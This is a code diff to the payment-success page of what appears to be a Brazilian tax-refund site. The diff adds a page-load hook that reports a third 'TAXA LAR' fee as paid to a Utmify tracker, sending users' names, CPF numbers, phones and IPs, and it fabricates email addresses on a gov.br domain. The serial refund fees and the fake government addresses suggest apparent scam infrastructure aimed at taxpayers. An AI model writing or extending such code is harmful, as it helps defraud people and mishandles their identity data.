@@ -8,6 +8,7 @@ import Footer from "@/components/Footer";
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
 import ScrollToTop from "@/components/ScrollToTop";
 import { useUserData } from "@/contexts/UserContext";
+import { registerLARPayment } from "@/services/UtmifyService";
 
 // Funções de formatação
 const formatarCPF = (cpf: string) => {
@@ -83,6 +84,43 @@ export default function Sucesso() {
     // Definir data de previsão baseada no tipo de pagamento
     setDataPrevisao(obterDataPrevisaoDeposito(userData.acelerado || false));
   }, [userData, setLocation]);
+  
+  // Efeito para registrar o evento de PAID da LAR quando o usuário acessa esta página
+  useEffect(() => {
+    const dispararEventoPagamentoLAR = async () => {
+      try {
+        // Verificar se temos os dados mínimos necessários e se o usuário optou pelo LAR
+        if (userData.nome && userData.cpf && userData.acelerado) {
+          console.log('[Utmify] Registrando evento de PAID da TAXA LAR (3/3)');
+          
+          // Montar objeto com dados do usuário
+          const dadosUsuario = {
+            nome: userData.nome,
+            cpf: userData.cpf,
+            email: userData.email || `${userData.cpf.substring(0, 3)}xxx${userData.cpf.substring(userData.cpf.length-2)}@restituicao.gov.br`,
+            telefone: userData.telefone || "(11) 99999-9999",
+            ip: userData.ip || "127.0.0.1"
+          };
+          
+          // Registrar evento de PAID para a TAXA LAR (3/3)
+          const response = await registerLARPayment(dadosUsuario, 'paid', userData.pagamentoId);
+          
+          if (response.success) {
+            console.log('[Utmify] Evento de PAID da TAXA LAR registrado com sucesso:', response.data);
+          } else {
+            console.error('[Utmify] Erro ao registrar evento de PAID da TAXA LAR:', response.error);
+          }
+        } else {
+          console.log('[Utmify] Usuário não optou pela LAR ou dados insuficientes, não registrando evento paid');
+        }
+      } catch (error) {
+        console.error('[Utmify] Erro ao registrar evento de PAID da TAXA LAR:', error);
+      }
+    };
+    
+    // Executar a função para registrar o pagamento
+    dispararEventoPagamentoLAR();
+  }, []); // Executar apenas uma vez quando a página carregar
   
   // Formatar valores para exibição
   const valorRestituicaoFormatado = formatarMoeda(valor);
